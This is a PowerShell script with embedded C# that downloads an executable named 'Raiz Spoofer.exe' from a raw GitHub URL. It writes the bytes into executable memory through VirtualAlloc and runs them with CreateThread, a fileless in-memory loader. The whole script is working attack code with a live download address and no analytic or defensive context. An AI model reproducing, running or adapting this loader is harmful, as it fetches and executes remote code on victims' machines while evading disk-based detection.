$url = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"
$NativeSource = @"
using System;
using System.Runtime.InteropServices;
public class Runner {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, out uint id);
    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h, uint m);
    public static void Run(byte[] d) {
        IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)d.Length, 0x3000, 0x40);
        Marshal.Copy(d, 0, p, d.Length);
        uint id;
        IntPtr h = CreateThread(IntPtr.Zero, 0, p, IntPtr.Zero, 0, out id);
        WaitForSingleObject(h, 0xFFFFFFFF);
    }
}
"@

try {
    Write-Host "[!] STARTING NATIVE LOADER..." -ForegroundColor Cyan
    $bin = (New-Object System.Net.WebClient).DownloadData($url)
    Add-Type -TypeDefinition $NativeSource
    Write-Host "[!] EXECUTING IN MEMORY..." -ForegroundColor Green
    [Runner]::Run($bin)
} catch {
    Write-Host "[-] ERROR: $($_.Exception.Message)" -ForegroundColor Red
}
